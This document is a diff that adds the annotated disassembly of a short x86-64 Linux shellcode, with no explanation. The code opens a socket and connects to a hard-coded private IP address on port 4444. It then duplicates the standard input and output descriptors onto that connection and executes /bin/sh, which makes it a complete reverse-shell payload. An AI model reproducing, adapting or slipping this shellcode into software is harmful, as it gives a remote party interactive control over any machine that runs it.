@@ -1,0 +1,36 @@
+00000000  6A29              push byte +0x29
+00000002  58                pop rax
+00000003  99                cdq
+00000004  6A02              push byte +0x2
+00000006  5F                pop rdi
+00000007  6A01              push byte +0x1
+00000009  5E                pop rsi
+0000000A  0F05              syscall
+0000000C  4897              xchg rax,rdi
+0000000E  48B90200115CC0A8  mov rcx,0x946aa8c05c110002
+         -6A94
+00000018  51                push rcx
+00000019  4889E6            mov rsi,rsp
+0000001C  6A10              push byte +0x10
+0000001E  5A                pop rdx
+0000001F  6A2A              push byte +0x2a
+00000021  58                pop rax
+00000022  0F05              syscall
+00000024  6A03              push byte +0x3
+00000026  5E                pop rsi
+00000027  48FFCE            dec rsi
+0000002A  6A21              push byte +0x21
+0000002C  58                pop rax
+0000002D  0F05              syscall
+0000002F  75F6              jnz 0x27
+00000031  6A3B              push byte +0x3b
+00000033  58                pop rax
+00000034  99                cdq
+00000035  48BB2F62696E2F73  mov rbx,0x68732f6e69622f
+         -6800
+0000003F  53                push rbx
+00000040  4889E7            mov rdi,rsp
+00000043  52                push rdx
+00000044  57                push rdi
+00000045  4889E6            mov rsi,rsp
+00000048  0F05              syscall
